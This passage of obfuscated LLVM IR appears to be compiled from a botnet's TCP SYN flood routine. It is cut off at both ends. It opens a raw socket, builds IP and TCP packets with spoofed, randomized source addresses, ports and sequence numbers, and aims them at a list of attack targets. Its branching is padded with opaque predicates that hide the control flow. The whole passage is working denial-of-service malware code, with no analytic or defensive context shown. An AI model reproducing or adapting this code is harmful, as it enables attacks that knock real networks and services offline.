  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %581

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %581

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %317, %107
  %109 = load i32, i32* @x.25
  %110 = load i32, i32* @y.26
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %108
  %117 = load i32, i32* %9, align 4
  %118 = load i8, i8* %5, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  %121 = load i32, i32* @x.25
  %122 = load i32, i32* @y.26
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %120, label %129, label %320

; <label>:129:                                    ; preds = %originalBBpart2
  %130 = call noalias i8* @calloc(i64 128, i64 1) #6
  %131 = load i8**, i8*** %11, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  store i8* %130, i8** %134, align 8
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %27, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i64 1
  %143 = bitcast %struct.iphdr* %142 to %struct.tcphdr*
  store %struct.tcphdr* %143, %struct.tcphdr** %28, align 8
  %144 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i64 1
  %146 = bitcast %struct.tcphdr* %145 to i8*
  store i8* %146, i8** %29, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, 15
  %151 = or i8 %150, 64
  store i8 %151, i8* %148, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, -16
  %156 = or i8 %155, 5
  store i8 %156, i8* %153, align 4
  %157 = load i8, i8* %12, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %192

; <label>:172:                                    ; preds = %129
  %173 = load i32, i32* @x.25
  %174 = load i32, i32* @y.26
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %172
  %181 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i16 %181, i16* %183, align 2
  %184 = load i32, i32* @x.25
  %185 = load i32, i32* @y.26
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %192

; <label>:192:                                    ; preds = %originalBBpart24, %129
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* %9, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %9, align 4
  br label %108

; <label>:320:                                    ; preds = %originalBBpart2
  %321 = load i32, i32* @x.25
  %322 = load i32, i32* @y.26
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %320
  %329 = load i32, i32* @x.25
  %330 = load i32, i32* @y.26
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %337

; <label>:337:                                    ; preds = %580, %originalBBpart28
  store i32 0, i32* %9, align 4
  br label %338

; <label>:338:                                    ; preds = %577, %337
  %339 = load i32, i32* @x.25
  %340 = load i32, i32* @y.26
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %338
  %347 = load i32, i32* %9, align 4
  %348 = load i8, i8* %5, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %347, %349
  %351 = load i32, i32* @x.25
  %352 = load i32, i32* @y.26
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %350, label %359, label %580

; <label>:359:                                    ; preds = %originalBBpart212
  %360 = load i32, i32* @x.25
  %361 = load i32, i32* @y.26
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %359
  %368 = load i8**, i8*** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds i8*, i8** %368, i64 %370
  %372 = load i8*, i8** %371, align 8
  store i8* %372, i8** %30, align 8
  %373 = load i8*, i8** %30, align 8
  %374 = bitcast i8* %373 to %struct.iphdr*
  store %struct.iphdr* %374, %struct.iphdr** %31, align 8
  %375 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i64 1
  %377 = bitcast %struct.iphdr* %376 to %struct.tcphdr*
  store %struct.tcphdr* %377, %struct.tcphdr** %32, align 8
  %378 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 2
  %383 = load i8, i8* %382, align 4
  %384 = zext i8 %383 to i32
  %385 = icmp slt i32 %384, 32
  %386 = load i32, i32* @x.25
  %387 = load i32, i32* @y.26
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %385, label %394, label %431

; <label>:394:                                    ; preds = %originalBBpart216
  %395 = load i32, i32* @x.25
  %396 = load i32, i32* @y.26
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %394
  %403 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %404 = load i32, i32* %9, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 1
  %408 = load i32, i32* %407, align 4
  %409 = call i32 @ntohl(i32 %408) #7
  %410 = call i32 @rand_next()
  %411 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %412 = load i32, i32* %9, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 2
  %416 = load i8, i8* %415, align 4
  %417 = zext i8 %416 to i32
  %418 = lshr i32 %410, %417
  %419 = add i32 %409, %418
  %420 = call i32 @htonl(i32 %419) #7
  %421 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 9
  store i32 %420, i32* %422, align 4
  %423 = load i32, i32* @x.25
  %424 = load i32, i32* @y.26
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart232, label %originalBB18alteredBB

originalBBpart232:                                ; preds = %originalBB18
  br label %431

; <label>:431:                                    ; preds = %originalBBpart232, %originalBBpart216
  %432 = load i32, i32* %26, align 4
  %433 = icmp eq i32 %432, -1
  br i1 %433, label %434, label %438

; <label>:434:                                    ; preds = %431
  %435 = call i32 @rand_next()
  %436 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 8
  store i32 %435, i32* %437, align 4
  br label %438

; <label>:438:                                    ; preds = %434, %431
  %439 = load i16, i16* %13, align 2
  %440 = zext i16 %439 to i32
  %441 = icmp eq i32 %440, 65535
  br i1 %441, label %442, label %448

; <label>:442:                                    ; preds = %438
  %443 = call i32 @rand_next()
  %444 = and i32 %443, 65535
  %445 = trunc i32 %444 to i16
  %446 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 3
  store i16 %445, i16* %447, align 4
  br label %448

; <label>:448:                                    ; preds = %442, %438
  %449 = load i16, i16* %16, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %474

; <label>:452:                                    ; preds = %448
  %453 = load i32, i32* @x.25
  %454 = load i32, i32* @y.26
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %452
  %461 = call i32 @rand_next()
  %462 = and i32 %461, 65535
  %463 = trunc i32 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 0
  store i16 %463, i16* %465, align 4
  %466 = load i32, i32* @x.25
  %467 = load i32, i32* @y.26
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart241, label %originalBB34alteredBB

originalBBpart241:                                ; preds = %originalBB34
  br label %474

; <label>:474:                                    ; preds = %originalBBpart241, %448
  %475 = load i16, i16* %17, align 2
  %476 = zext i16 %475 to i32
  %477 = icmp eq i32 %476, 65535
  br i1 %477, label %478, label %500

; <label>:478:                                    ; preds = %474
  %479 = load i32, i32* @x.25
  %480 = load i32, i32* @y.26
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %478
  %487 = call i32 @rand_next()
  %488 = and i32 %487, 65535
  %489 = trunc i32 %488 to i16
  %490 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 1
  store i16 %489, i16* %491, align 2
  %492 = load i32, i32* @x.25
  %493 = load i32, i32* @y.26
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart253, label %originalBB43alteredBB

originalBBpart253:                                ; preds = %originalBB43
  br label %500

; <label>:500:                                    ; preds = %originalBBpart253, %474
  %501 = load i32, i32* %18, align 4
  %502 = icmp eq i32 %501, 65535
  br i1 %502, label %503, label %523

; <label>:503:                                    ; preds = %500
  %504 = load i32, i32* @x.25
  %505 = load i32, i32* @y.26
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %503
  %512 = call i32 @rand_next()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 2
  store i32 %512, i32* %514, align 4
  %515 = load i32, i32* @x.25
  %516 = load i32, i32* @y.26
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %523

; <label>:523:                                    ; preds = %originalBBpart257, %500
  %524 = load i32, i32* %19, align 4
  %525 = icmp eq i32 %524, 65535
  br i1 %525, label %526, label %530

; <label>:526:                                    ; preds = %523
  %527 = call i32 @rand_next()
  %528 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 3
  store i32 %527, i32* %529, align 4
  br label %530

; <label>:530:                                    ; preds = %526, %523
  %531 = load i8, i8* %20, align 1
  %532 = icmp ne i8 %531, 0
  br i1 %532, label %533, label %539

; <label>:533:                                    ; preds = %530
  %534 = call i32 @rand_next()
  %535 = and i32 %534, 65535
  %536 = trunc i32 %535 to i16
  %537 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  br label %539

; <label>:539:                                    ; preds = %533, %530
  %540 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 7
  store i16 0, i16* %541, align 2
  %542 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %543 = bitcast %struct.iphdr* %542 to i16*
  %544 = call zeroext i16 @checksum_generic(i16* %543, i32 20)
  %545 = load %struct.iphdr*, %struct.iphdr** %31, align 8
